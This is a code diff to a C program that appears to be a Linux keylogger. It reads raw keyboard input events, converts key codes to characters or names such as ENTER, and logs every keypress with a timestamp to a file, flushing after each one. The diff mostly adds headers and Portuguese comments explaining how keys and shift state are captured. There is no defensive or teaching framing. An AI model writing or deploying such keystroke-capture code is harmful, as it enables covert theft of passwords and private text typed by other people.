@@ -1,6 +1,10 @@
 #include <stdio.h>
+#include <fcntl.h>
 #include <unistd.h>
 #include <linux/input.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <time.h>
 
 #include "input.h"
 #include "teclas.h"
@@ -34,8 +38,10 @@ int main() {
             break;
         }
         
+        // se for tecla
         if(e.type == 1) {
             
+            // shift apertado ou solto
             if(e.code == 42 || e.code == 54) {
                 if(e.value == 1) {
                     shift = 1;
@@ -45,11 +51,13 @@ int main() {
                 continue;
             }
             
+            // so quando aperta (value=1)
             if(e.value == 1) {
                 
                 char horario[20];
                 pegar_horario(horario, sizeof(horario));
                 
+                // tenta converter tecla normal
                 if(e.code < 128 && teclas[e.code] != 0) {
                     char letra = teclas[e.code];
                     
@@ -61,8 +69,9 @@ int main() {
                     fprintf(log, "[%s] '%c'\n", horario, letra);
                 }
                 else {
+                    // teclas especiais
                     char *nome_tecla = "";
-
+                    // reconhecimento de teclas especiais usando ascii para identificação
                     switch(e.code) {
                         case 28:
                             nome_tecla = "ENTER";
@@ -117,6 +126,7 @@ int main() {
                     fprintf(log, "[%s] %s\n", horario, nome_tecla);
                 }
                 
+                // força escrever no arquivo
                 fflush(log);
             }
         }
